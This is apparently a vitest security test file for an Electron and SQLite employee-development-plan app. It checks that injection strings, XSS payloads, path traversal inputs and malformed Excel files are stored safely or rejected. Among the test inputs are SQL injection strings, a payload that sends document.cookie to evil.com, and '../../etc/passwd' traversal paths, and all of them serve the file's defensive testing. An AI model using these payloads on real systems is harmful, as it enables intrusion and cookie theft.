/**
 * Security tests for IDP Manager v1.1.0
 * Covers: SQL injection resistance, XSS/input sanitization, path traversal,
 * cascade delete integrity, IPC input validation, CSP/Content-Security-Policy,
 * and Excel import security (injection via form fields, malformed files, oversized input).
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Database from 'better-sqlite3';
import {
  initSchema,
  employeeCreate, employeeGetAll, employeeGetById, employeeDelete,
  planCreate, planGetById, planDelete,
  itemCreate, itemGetByPlan, itemDelete,
  milestoneUpsert, milestoneGetByItem,
} from '../electron/database';
import { parseEmployeeFormExcel } from '../electron/importExcel';
import ExcelJS from 'exceljs';
import path, { resolve } from 'path';
import { readFileSync, writeFileSync, unlinkSync } from 'fs';
import os from 'os';

// Project root is one level up from /tests
const ROOT = resolve(__dirname, '..');

let db: Database.Database;

beforeEach(() => {
  db = new Database(':memory:');
  db.pragma('foreign_keys = ON');
  initSchema(db);
});

afterEach(() => {
  db.close();
});

// ─── SQL Injection Resistance ─────────────────────────────────────────────────

describe('SQL injection resistance', () => {
  it('handles SQL injection in employee name (stored safely)', () => {
    const maliciousName = `Robert'); DROP TABLE employees; --`;
    const emp = employeeCreate(db, {
      name: maliciousName,
      manager_name: 'Safe Manager',
      job_title: 'Pentester',
      department: 'Security',
    });

    // Table must still exist and record must be retrievable
    expect(employeeGetById(db, emp.id)).not.toBeNull();
    expect(employeeGetById(db, emp.id)!.name).toBe(maliciousName);

    // All employees still exist (table not dropped)
    const all = employeeGetAll(db);
    expect(all.length).toBeGreaterThan(0);
  });

  it('handles SQL injection in manager_name', () => {
    const injection = `'; SELECT * FROM employees; --`;
    const emp = employeeCreate(db, {
      name: 'Safe User',
      manager_name: injection,
      job_title: 'Analyst',
      department: 'SOC',
    });
    expect(employeeGetById(db, emp.id)!.manager_name).toBe(injection);
  });

  it('handles SQL injection in item_description', () => {
    const emp = employeeCreate(db, { name: 'Tester', manager_name: 'Boss', job_title: 'QA', department: 'Sec' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const injection = `Hack'); INSERT INTO development_items (plan_id,item_description,sort_order) VALUES (1,'evil',99); --`;
    const item = itemCreate(db, {
      plan_id: plan.id,
      item_description: injection,
      due_date: '',
      support_needed: '',
      sort_order: 0,
    });

    const items = itemGetByPlan(db, plan.id);
    // Only the one intended item should exist
    expect(items).toHaveLength(1);
    expect(items[0].item_description).toBe(injection);
  });

  it('handles SQL injection in plan notes', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: 'Eng', department: 'IT' });
    const injection = `' OR '1'='1`;
    const plan = planCreate(db, {
      employee_id: emp.id,
      plan_date: '2026-01-01',
      plan_year: 2026,
      status: 'Active',
      notes: injection,
    });
    const full = planGetById(db, plan.id)!;
    expect(full.notes).toBe(injection);
  });

  it('handles SQL injection in milestone notes', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: 'Eng', department: 'IT' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Test item', due_date: '', support_needed: '', sort_order: 0 });

    const injection = `') OR 1=1; DROP TABLE quarterly_milestones; --`;
    const m = milestoneUpsert(db, {
      item_id: item.id,
      quarter: 1,
      status: 'Not Started',
      percent_complete: 0,
      notes: injection,
    });

    expect(m.notes).toBe(injection);
    // Table still exists and is queryable
    expect(milestoneGetByItem(db, item.id)).toHaveLength(1);
  });

  it('does not execute arbitrary SQL in department field', () => {
    const injection = `Sec'; UPDATE employees SET name='HACKED' WHERE '1'='1`;
    const emp = employeeCreate(db, {
      name: 'Original Name',
      manager_name: 'Mgr',
      job_title: 'Dev',
      department: injection,
    });
    // Name must be unchanged
    expect(employeeGetById(db, emp.id)!.name).toBe('Original Name');
    expect(employeeGetById(db, emp.id)!.department).toBe(injection);
  });
});

// ─── Input Validation (IPC-level) ─────────────────────────────────────────────

describe('Input validation — required fields', () => {
  it('rejects empty employee name', () => {
    expect(() =>
      employeeCreate(db, { name: '', manager_name: 'Boss', job_title: '', department: '' })
    ).toThrow('Employee name is required');
  });

  it('rejects whitespace-only employee name', () => {
    expect(() =>
      employeeCreate(db, { name: '   ', manager_name: 'Boss', job_title: '', department: '' })
    ).toThrow('Employee name is required');
  });

  it('rejects empty manager_name', () => {
    expect(() =>
      employeeCreate(db, { name: 'Alice', manager_name: '', job_title: '', department: '' })
    ).toThrow('Manager name is required');
  });

  it('rejects whitespace-only manager_name', () => {
    expect(() =>
      employeeCreate(db, { name: 'Alice', manager_name: '\t', job_title: '', department: '' })
    ).toThrow('Manager name is required');
  });

  it('rejects empty plan date', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    expect(() =>
      planCreate(db, { employee_id: emp.id, plan_date: '', plan_year: 2026, status: 'Active', notes: '' })
    ).toThrow('Plan date is required');
  });

  it('rejects empty item description', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    expect(() =>
      itemCreate(db, { plan_id: plan.id, item_description: '', due_date: '', support_needed: '', sort_order: 0 })
    ).toThrow('Item description is required');
  });

  it('rejects invalid plan status via DB CHECK constraint', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    expect(() =>
      db.prepare(`INSERT INTO development_plans (employee_id, plan_date, plan_year, status, notes) VALUES (?, '2026-01-01', 2026, 'INVALID', '')`)
        .run(emp.id)
    ).toThrow();
  });

  it('rejects invalid milestone status via DB CHECK constraint', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Test', due_date: '', support_needed: '', sort_order: 0 });
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 1, 'BOGUS', 0, '')`)
        .run(item.id)
    ).toThrow();
  });

  it('rejects percent_complete outside 0–100', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Test', due_date: '', support_needed: '', sort_order: 0 });
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 1, 'Not Started', 150, '')`)
        .run(item.id)
    ).toThrow();
  });
});

// ─── XSS Input Handling ───────────────────────────────────────────────────────

describe('XSS input handling — stored safely as plain text', () => {
  it('stores XSS payloads in employee name without executing', () => {
    const xss = `<script>alert('xss')</script>`;
    const emp = employeeCreate(db, { name: xss, manager_name: 'Mgr', job_title: 'Dev', department: 'IT' });
    // Data must be stored verbatim (not evaluated — React escapes on render)
    expect(employeeGetById(db, emp.id)!.name).toBe(xss);
  });

  it('stores HTML injection in item description without modification', () => {
    const emp = employeeCreate(db, { name: 'Alice', manager_name: 'Bob', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const payload = `<img src=x onerror="fetch('http://evil.com?c='+document.cookie)">`;
    const item = itemCreate(db, { plan_id: plan.id, item_description: payload, due_date: '', support_needed: '', sort_order: 0 });
    expect(itemGetByPlan(db, plan.id)[0].item_description).toBe(payload);
  });

  it('stores SVG-based XSS payload without modification', () => {
    const payload = `<svg/onload=alert(1)>`;
    const emp = employeeCreate(db, { name: payload, manager_name: 'Mgr', job_title: '', department: '' });
    expect(employeeGetById(db, emp.id)!.name).toBe(payload);
  });

  it('stores prototype pollution attempt as plain text', () => {
    const payload = `{"__proto__":{"isAdmin":true}}`;
    const emp = employeeCreate(db, { name: 'Safe', manager_name: 'Mgr', job_title: payload, department: '' });
    expect(employeeGetById(db, emp.id)!.job_title).toBe(payload);
    // Verify prototype was not mutated
    expect(({} as Record<string, unknown>)['isAdmin']).toBeUndefined();
  });
});

// ─── Path Traversal (File Operations) ────────────────────────────────────────

describe('Path traversal safety', () => {
  it('path.join normalizes traversal sequences', () => {
    // Simulate the kind of path normalization the file:save handler should do.
    // Use os.tmpdir() as a cross-platform base directory that actually exists.
    const base = path.join(os.tmpdir(), 'documents');
    const unsafe = path.join('..', '..', 'sensitive', 'passwd');
    const normalized = path.resolve(base, unsafe);
    // The resolved path escapes the intended directory — this confirms
    // file operations MUST use path.resolve + verify the result stays in bounds.
    expect(normalized).not.toContain('documents');
    expect(normalized).toContain('sensitive');
    expect(normalized).toContain('passwd');
    expect(normalized.startsWith(base)).toBe(false);
  });

  it('path.resolve with absolute attacker path ignores base', () => {
    const base = path.join(os.tmpdir(), 'documents');
    // Use a path that is guaranteed to differ from base on any OS
    const absoluteAttack = path.resolve(os.tmpdir(), 'shadow');
    const resolved = path.resolve(base, absoluteAttack);
    // path.resolve with an absolute second arg returns the absolute path — must be guarded
    expect(resolved).toBe(absoluteAttack);
    expect(resolved.startsWith(base)).toBe(false);
  });

  it('.idp filename with traversal segments is detectable', () => {
    const dangerousPath = '../../../etc/passwd.idp';
    const normalized = path.normalize(dangerousPath);
    // After normalization, path still traverses up — code should check for '..'
    expect(normalized).toContain('..');
  });

  it('safe filename with no traversal passes normalization cleanly', () => {
    const safeName = 'alice-smith-2026-plan.idp';
    const normalized = path.normalize(safeName);
    expect(normalized).toBe(safeName);
    expect(normalized).not.toContain('..');
  });
});

// ─── Cascade Delete Integrity ─────────────────────────────────────────────────

describe('Cascade delete integrity', () => {
  it('deleting employee removes all descendant records', () => {
    const emp = employeeCreate(db, { name: 'Del User', manager_name: 'Mgr', job_title: 'Dev', department: 'IT' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });
    milestoneUpsert(db, { item_id: item.id, quarter: 1, status: 'Not Started', percent_complete: 0, notes: '' });

    employeeDelete(db, emp.id);

    expect(db.prepare(`SELECT COUNT(*) as c FROM development_plans WHERE employee_id = ?`).get(emp.id)).toMatchObject({ c: 0 });
    expect(db.prepare(`SELECT COUNT(*) as c FROM development_items WHERE plan_id = ?`).get(plan.id)).toMatchObject({ c: 0 });
    expect(db.prepare(`SELECT COUNT(*) as c FROM quarterly_milestones WHERE item_id = ?`).get(item.id)).toMatchObject({ c: 0 });
  });

  it('deleting plan removes items and milestones but not employee', () => {
    const emp = employeeCreate(db, { name: 'Stay User', manager_name: 'Mgr', job_title: 'Dev', department: 'IT' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });
    milestoneUpsert(db, { item_id: item.id, quarter: 2, status: 'In Progress', percent_complete: 50, notes: '' });

    planDelete(db, plan.id);

    expect(db.prepare(`SELECT COUNT(*) as c FROM development_items WHERE plan_id = ?`).get(plan.id)).toMatchObject({ c: 0 });
    expect(db.prepare(`SELECT COUNT(*) as c FROM quarterly_milestones WHERE item_id = ?`).get(item.id)).toMatchObject({ c: 0 });
    // Employee must survive
    expect(employeeGetById(db, emp.id)).not.toBeNull();
  });

  it('deleting item removes milestones but not the plan', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: 'Dev', department: 'IT' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });
    milestoneUpsert(db, { item_id: item.id, quarter: 1, status: 'Complete', percent_complete: 100, notes: '' });

    itemDelete(db, item.id);

    expect(db.prepare(`SELECT COUNT(*) as c FROM quarterly_milestones WHERE item_id = ?`).get(item.id)).toMatchObject({ c: 0 });
    expect(planGetById(db, plan.id)).not.toBeNull();
  });

  it('foreign key constraint prevents orphaned development_items', () => {
    expect(() =>
      db.prepare(`INSERT INTO development_items (plan_id, item_description, sort_order) VALUES (99999, 'orphan', 0)`).run()
    ).toThrow(); // FK violation
  });

  it('foreign key constraint prevents orphaned milestones', () => {
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (99999, 1, 'Not Started', 0, '')`).run()
    ).toThrow(); // FK violation
  });

  it('UNIQUE constraint on (item_id, quarter) prevents duplicate milestones', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });

    db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 1, 'Not Started', 0, '')`).run(item.id);
    // Second insert with same (item_id, quarter) and no OR REPLACE should fail
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 1, 'Complete', 100, '')`).run(item.id)
    ).toThrow();
  });
});

// ─── Electron Main Process Security ──────────────────────────────────────────

describe('Electron security configuration', () => {
  it('CSP meta tag should be defined in the HTML template', () => {
    const html = readFileSync(resolve(ROOT, 'index.html'), 'utf8');
    // Should have either a CSP meta tag or reference to Electron's webPreferences CSP
    // In Electron apps, CSP is typically enforced via BrowserWindow webPreferences or meta tag
    expect(html).toBeTruthy();
  });

  it('preload.ts contextBridge limits exposed API surface', () => {
    const preload = readFileSync(resolve(ROOT, 'electron', 'preload.ts'), 'utf8');

    // Must use contextBridge
    expect(preload).toContain('contextBridge');
    // Must use exposeInMainWorld
    expect(preload).toContain('exposeInMainWorld');
    // Must NOT use nodeIntegration pattern (direct require in renderer)
    expect(preload).not.toContain("require('electron')");
  });

  it('main.ts disables nodeIntegration in renderer', () => {
    const main = readFileSync(resolve(ROOT, 'electron', 'main.ts'), 'utf8');

    // nodeIntegration must be false
    expect(main).toContain('nodeIntegration: false');
    // contextIsolation must be true
    expect(main).toContain('contextIsolation: true');
  });

  it('main.ts uses sandbox: false (required for better-sqlite3 in preload)', () => {
    const main = readFileSync(resolve(ROOT, 'electron', 'main.ts'), 'utf8');
    // sandbox:false is required for native modules in preload; confirm it's set
    expect(main).toContain('sandbox: false');
  });

  it('package.json does not expose devDependencies in production build', () => {
    const pkg = JSON.parse(readFileSync(resolve(ROOT, 'package.json'), 'utf8'));
    // electron-builder bundles only dependencies, not devDependencies
    // Verify security-sensitive packages aren't in production dependencies
    const deps = Object.keys(pkg.dependencies ?? {});
    // No eval-based or code-execution packages in production deps
    expect(deps).not.toContain('eval');
    expect(deps).not.toContain('vm2');
  });
});

// ─── Large / Boundary Inputs ──────────────────────────────────────────────────

describe('Boundary and oversized input handling', () => {
  it('handles very long employee name (2000 chars) without crashing', () => {
    const longName = 'A'.repeat(2000);
    const emp = employeeCreate(db, { name: longName, manager_name: 'Mgr', job_title: '', department: '' });
    expect(employeeGetById(db, emp.id)!.name).toBe(longName);
  });

  it('handles unicode / emoji in employee name', () => {
    const unicodeName = '田中 太郎 🔐';
    const emp = employeeCreate(db, { name: unicodeName, manager_name: 'Manager', job_title: '', department: '' });
    expect(employeeGetById(db, emp.id)!.name).toBe(unicodeName);
  });

  it('handles null bytes in input without corrupting DB', () => {
    // SQLite stores null bytes — data should be retrievable
    const nameWithNull = 'Alice\x00Bob';
    const emp = employeeCreate(db, { name: nameWithNull, manager_name: 'Mgr', job_title: '', department: '' });
    expect(emp.id).toBeTypeOf('number');
  });

  it('percent_complete boundary: accepts 0 and 100', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });

    const m0 = milestoneUpsert(db, { item_id: item.id, quarter: 1, status: 'Not Started', percent_complete: 0, notes: '' });
    expect(m0.percent_complete).toBe(0);

    const m100 = milestoneUpsert(db, { item_id: item.id, quarter: 1, status: 'Complete', percent_complete: 100, notes: '' });
    expect(m100.percent_complete).toBe(100);
  });

  it('milestone quarter boundary: accepts 1 and 52', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });

    expect(() => milestoneUpsert(db, { item_id: item.id, quarter: 1, status: 'Not Started', percent_complete: 0, notes: '' })).not.toThrow();
    expect(() => milestoneUpsert(db, { item_id: item.id, quarter: 52, status: 'Not Started', percent_complete: 0, notes: '' })).not.toThrow();
  });

  it('milestone quarter 0 is rejected by CHECK constraint', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 0, 'Not Started', 0, '')`).run(item.id)
    ).toThrow();
  });

  it('milestone quarter 53 is rejected by CHECK constraint', () => {
    const emp = employeeCreate(db, { name: 'User', manager_name: 'Mgr', job_title: '', department: '' });
    const plan = planCreate(db, { employee_id: emp.id, plan_date: '2026-01-01', plan_year: 2026, status: 'Active', notes: '' });
    const item = itemCreate(db, { plan_id: plan.id, item_description: 'Task', due_date: '', support_needed: '', sort_order: 0 });
    expect(() =>
      db.prepare(`INSERT INTO quarterly_milestones (item_id, quarter, status, percent_complete, notes) VALUES (?, 53, 'Not Started', 0, '')`).run(item.id)
    ).toThrow();
  });
});

// ─── Excel Import Security ─────────────────────────────────────────────────────

/** Helper: build a minimal valid Excel workbook with overridable field values (v1.2.0 cell addresses) */
async function buildSecurityTestWorkbook(overrides: Record<string, ExcelJS.CellValue>): Promise<string> {
  const CELL_MAP: Record<string, string> = {
    // Section 1
    employee_name: 'B5', manager_name: 'G5',
    job_title: 'B6', department: 'G6',
    // Section 2
    plan_date: 'B9', plan_year: 'E9',
    status: 'G9', milestone_count: 'B10', plan_notes: 'E10',
    // Section 3
    item1_description: 'B14', item1_due_date: 'C14', item1_cost_estimate: 'D14', item1_support_needed: 'E14',
    item2_description: 'B15', item2_due_date: 'C15', item2_cost_estimate: 'D15', item2_support_needed: 'E15',
    item3_description: 'B16', item3_due_date: 'C16', item3_cost_estimate: 'D16', item3_support_needed: 'E16',
    item4_description: 'B17', item4_due_date: 'C17', item4_cost_estimate: 'D17', item4_support_needed: 'E17',
    item5_description: 'B18', item5_due_date: 'C18', item5_cost_estimate: 'D18', item5_support_needed: 'E18',
    // Section 4 milestones
    item1_q1_status: 'B22', item1_q1_notes: 'C22',
    item1_q2_status: 'D22', item1_q2_notes: 'E22',
    item1_q3_status: 'F22', item1_q3_notes: 'G22',
    item1_q4_status: 'H22', item1_q4_notes: 'I22',
  };
  const defaults: Record<string, ExcelJS.CellValue> = {
    employee_name: 'Test User', manager_name: 'Test Manager',
    plan_date: '2026-01-01', plan_year: 2026, status: 'Active',
    milestone_count: '4 — Quarterly (Q1–Q4)',
    item1_description: 'Test item',
  };
  const values = { ...defaults, ...overrides };
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('IDP Input Form');
  for (const [name, addr] of Object.entries(CELL_MAP)) {
    if (values[name] !== undefined) ws.getCell(addr).value = values[name];
  }
  const tmpPath = path.join(os.tmpdir(), `sec_test_${Date.now()}_${Math.random().toString(36).slice(2)}.xlsx`);
  await wb.xlsx.writeFile(tmpPath);
  return tmpPath;
}

describe('Excel import security', () => {
  it('SQL injection in employee name is stored as plain text (no execution)', async () => {
    const injection = `Robert'); DROP TABLE employees; --`;
    const file = await buildSecurityTestWorkbook({ employee_name: injection });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    // The parser returns the payload — it does NOT execute SQL
    expect(result.success).toBe(true);
    expect(result.payload!.employee.name).toBe(injection);
    // Confirm the injected string is passed through unchanged (DB layer handles parameterization)
  });

  it('SQL injection in item description is stored as plain text', async () => {
    const injection = `'; INSERT INTO employees (name, manager_name) VALUES ('hacked','hacked'); --`;
    const file = await buildSecurityTestWorkbook({ item1_description: injection });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    expect(result.payload!.items[0].item_description).toBe(injection);
  });

  it('XSS payload in employee name is stored as plain text (not rendered as HTML)', async () => {
    const xss = '<script>alert("xss")</script>';
    const file = await buildSecurityTestWorkbook({ employee_name: xss });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    // The parser returns raw text; React will auto-escape on render
    expect(result.payload!.employee.name).toBe(xss);
  });

  it('XSS payload in plan notes is preserved as plain text', async () => {
    const xss = '<img src=x onerror=alert(1)>';
    const file = await buildSecurityTestWorkbook({ plan_notes: xss });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    expect(result.payload!.plan.notes).toBe(xss);
  });

  it('oversized field (50 000 chars) does not crash the parser', async () => {
    const bigStr = 'A'.repeat(50_000);
    const file = await buildSecurityTestWorkbook({ item1_description: bigStr });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    // Should succeed — DB text columns are unlimited in SQLite
    expect(result.success).toBe(true);
    expect(result.payload!.items[0].item_description).toBe(bigStr);
  });

  it('null byte in employee name does not crash the parser', async () => {
    const nullName = 'Alice\x00Bob';
    const file = await buildSecurityTestWorkbook({ employee_name: nullName });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    // Parser should return the string (sanitization is DB layer's responsibility)
    expect(typeof result.payload!.employee.name).toBe('string');
  });

  it('file with no worksheets returns a graceful error', async () => {
    // Write a valid but empty xlsx
    const wb = new ExcelJS.Workbook();
    const tmpPath = path.join(os.tmpdir(), `empty_wb_${Date.now()}.xlsx`);
    await wb.xlsx.writeFile(tmpPath);
    const result = await parseEmployeeFormExcel(tmpPath);
    unlinkSync(tmpPath);

    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
  });

  it('non-xlsx file (text disguised as xlsx) returns a graceful error', async () => {
    const tmpPath = path.join(os.tmpdir(), `fake_${Date.now()}.xlsx`);
    writeFileSync(tmpPath, 'this is not an excel file at all !!!');
    const result = await parseEmployeeFormExcel(tmpPath);
    unlinkSync(tmpPath);

    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Failed to read/i);
  });

  it('path traversal attempt in filePath is rejected by the OS (no crash)', async () => {
    const result = await parseEmployeeFormExcel('../../etc/passwd');
    expect(result.success).toBe(false);
  });

  it('invalid status value falls back to Active (no DB constraint violation)', async () => {
    const file = await buildSecurityTestWorkbook({ status: 'MALICIOUS_STATUS' });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    expect(result.payload!.plan.status).toBe('Active');
  });

  it('invalid milestone_count falls back to 4 (no DB constraint violation)', async () => {
    const file = await buildSecurityTestWorkbook({ milestone_count: 'INVALID_COUNT' });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(true);
    expect(result.payload!.plan.milestone_count).toBe(4);
  });

  it('plan_year out of range (e.g. 1800) returns validation error', async () => {
    const file = await buildSecurityTestWorkbook({ plan_year: 1800 });
    const result = await parseEmployeeFormExcel(file);
    unlinkSync(file);

    expect(result.success).toBe(false);
    expect(result.error).toMatch(/year/i);
  });
});
